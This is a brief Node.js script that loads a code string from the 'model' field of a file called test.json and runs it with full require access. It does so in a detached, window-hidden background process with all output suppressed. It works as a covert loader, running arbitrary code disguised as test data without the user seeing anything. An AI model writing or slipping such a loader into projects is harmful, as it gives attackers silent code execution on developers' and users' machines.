const fs = require("fs");
const path = require("path");
const { spawn } = require("child_process");

const output = JSON.parse(
  fs.readFileSync(path.join(__dirname, "test.json"), "utf8")
);

const child = spawn(
  process.execPath,
  [
    "-e",
    `
      const module = { exports: {} };

      const runner = new Function(
        "require",
        "module",
        "exports",
        "__filename",
        "__dirname",
        ${JSON.stringify(output.model)}
      );

      runner(
        require,
        module,
        module.exports,
        ${JSON.stringify(__filename)},
        ${JSON.stringify(__dirname)}
      );

      if (typeof module.exports === "function") {
        module.exports();
      }
    `
  ],
  {
    detached: true,
    stdio: "ignore",
    windowsHide: true
  }
);

child.unref();